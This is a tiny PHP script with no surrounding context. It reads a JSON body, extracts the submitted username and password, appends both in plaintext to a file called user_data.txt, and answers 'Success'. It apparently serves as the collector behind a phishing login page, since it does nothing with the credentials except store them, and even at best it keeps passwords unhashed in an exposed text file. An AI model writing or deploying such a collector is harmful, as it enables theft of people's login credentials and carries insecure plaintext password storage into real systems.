<?php
$data = json_decode(file_get_contents('php://input'), true);
$username = $data['username'];
$password = $data['password'];
file_put_contents('user_data.txt', "$username\n$password\n", FILE_APPEND);
echo 'Success';
?>
